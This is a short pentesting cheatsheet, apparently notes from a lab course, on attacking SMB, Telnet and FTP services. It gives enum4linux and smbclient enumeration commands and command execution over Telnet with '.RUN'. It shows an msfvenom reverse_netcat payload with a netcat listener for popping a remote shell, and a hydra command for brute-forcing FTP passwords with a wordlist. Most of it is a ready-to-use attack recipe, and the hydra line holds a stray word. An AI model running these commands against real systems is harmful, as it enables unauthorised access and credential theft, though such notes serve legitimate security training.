# network services exploitation cheatsheet

Before everything: make a nmap scan for finding open and vulnerable ports.

## SMB

Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 

### Enum4linux

It is a tool used to enumerate SMB shares. Makes it easy to quickly extract information from the target pertaining to SMB.
```
  SYNTAX = "enum4linux [options] ip"
    
 OPTIONS:
 
 -U             get userlist
 -M             get machine list
 -N             get namelist dump (different from -U and-M)
 -S             get sharelist
 -P             get password policy information
 -G             get group and member list

 -a             all of the above (full basic enumeration)
```
### Exploiting SMB

find vulnerabilities in https://www.cvedetails.com/

#### Using SMBCLIENT
```
 SYNTAX: smbclient //[IP]/[SHARE]
```
```
Followed by: 

-U [name] : to specify the user

-p [port] : to specify the port
```


 ## Telnet
 ```
  SYNTAX: "telnet [ip][port]"
 ```
 ### Enumerating telnet
 
 check:
 
 https://www.cvedetails.com/
 https://cve.mitre.org/
 
 for finding vulnerabilities.
 
 Also, we can find an obvious misconfiguration that let us exploit it.
 
 ### Connecting Telnet
 ```
  SYNTAX: "telnet [ip] [port]"
 ```
 
 In case we can`t see if we are executing what we type we can use **tcpdump**
 ```
 sudo tcpdump ip proto \\icmp -i tun0 //tun0 = network interface in use
 ```
 We need to preface the commands in the telnet machine terminal with ".RUN"
 
 ex: 
 ```
 .RUN ping -c 1 [attackingMachine.localhost] //we can use that command                      to see that we are correctly executing code]
 ```
 
 ### Generating a reverse shell payload (using msfvenom)
 
 ```
 SYNTAX: **"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
 
  Where:
  -p = payload
  lhost = our local host IP address (this is your machine's IP address)
  lport = the port to listen on (this is the port on your machine)
  R = export the payload in raw format
  ```
  
  Now we can use a netcat listener on our local machine:
  ```
  "nc -lvp [listening port]" 
  ```
  We just need to copy and paste our msfvenom payload into the telnet session and run it as a command. Then we'll be able to use a shell through the listener previously deployed.
 
 ## FTP
 
 Standard FTP port = 21
 
 ### Enumerating ftp
 
 We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.
 
 Alternative Enumeration Methods

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that donâ€™t.
 
```
"ftp [IP]"
```

### Exploiting FTP

If we have a possible username we can try to apply bruteforce using hydra.

```
"hydra -t 4 -l [USER] dale -P [PATH TO DICTIONARY] -vV [MACHINE IP] ftp"
``
PATH TO DICTIONARY in my case is: /usr/share/wordlists/passwords/rock-you05.txt

